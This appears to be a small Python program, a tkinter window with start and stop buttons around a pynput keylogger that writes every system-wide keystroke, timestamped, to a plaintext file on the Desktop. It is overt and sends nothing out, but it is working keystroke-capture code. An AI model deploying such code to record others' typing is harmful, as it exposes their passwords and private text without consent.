import tkinter as tk
from pynput import keyboard
from threading import Thread
import datetime
import os

# Set the path to save the log file to your Desktop
log_file_path = os.path.join(os.path.expanduser("~"), "Desktop", "key_log.txt")

# Global flag
is_logging = False

def write_log(key):
    try:
        with open(log_file_path, "a") as f:
            f.write(f"{datetime.datetime.now()} - {key}\n")
            f.flush()  # Ensure it writes immediately
        print(f"Logged: {key}")
    except Exception as e:
        print(f"Error writing to log: {e}")

def start_keylogger():
    global is_logging
    if is_logging:
        return
    is_logging = True

    def on_press(key):
        if is_logging:
            write_log(key)

    def run_listener():
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    t = Thread(target=run_listener)
    t.daemon = True
    t.start()
    status_label.config(text="Keylogger is running...", fg="green")

def stop_keylogger():
    global is_logging
    is_logging = False
    status_label.config(text="Keylogger stopped.", fg="red")

# GUI setup
root = tk.Tk()
root.title("Keylogger GUI")
root.geometry("300x200")

tk.Label(root, text="Keylogger Tool", font=("Arial", 16)).pack(pady=10)
tk.Button(root, text="Start Logging", bg="green", fg="white", command=start_keylogger).pack(pady=10)
tk.Button(root, text="Stop Logging", bg="red", fg="white", command=stop_keylogger).pack(pady=10)
status_label = tk.Label(root, text="Keylogger idle.", fg="gray")
status_label.pack(pady=10)
tk.Label(root, text="Log saved as 'key_log.txt' on Desktop").pack(pady=5)

root.mainloop()
